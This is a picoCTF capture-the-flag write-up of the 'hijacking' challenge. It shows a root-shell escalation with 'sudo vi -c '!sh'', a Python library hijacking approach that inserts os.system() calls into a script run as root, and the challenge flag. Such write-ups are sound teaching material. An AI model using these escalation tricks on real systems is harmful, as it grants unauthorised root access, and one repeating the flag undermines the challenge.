##Challenge: hijacking

##Category: Binary Exploitation

##Description: Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

###Hints:

####1. Check for Hidden files

####2. No place like Home:)

Logging into the server, I first ran ls -la and saw a hidden file labeled .server.py, suggesting it is a Python script. Here are its contents:

```python
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

In short, it just collects the IP address of the picoCTF website...not much. After much hammering the server with different ideas and failing, I idscovered a vulnerability on the server. I typed in sudo -l, which shows what operations I can perform with sudo privileges. Here is what the command output:

> Matching Defaults entries for picoctf on challenge:
>    env_reset, mail_badpass,
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
>User picoctf may run the following commands on challenge:
>    (ALL) /usr/bin/vi
>    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

So, I have permission to run sudo on vi, a text editor, and I can run .server.py with python3 as root with sudo. I then found a small command that I could use to pop a root shell:

```bash sudo vi -c '!sh'```

To break the command down, vi has a -c argument in which u can supply a command, which in this case is popping a root shell with !sh. Thus, I found the flag file in /root/.flag.txt and got the flag.

Now, when I got the flag, it seemed that I might have used an inintented solution, as it suggests Python library hijacking, which is editing a Python library file or script in order to execute malicious code. The contents of sudo -l suggest I have to power to execute the .server.py script under root conditions, so the intended way seems to be to insert some code in any Python library or script to spit out the flag. I thus implemented some os.system() commands into .server.py, and boom, there's the flag.

####References: [1](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

###Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}

Solved by giggsterpuku
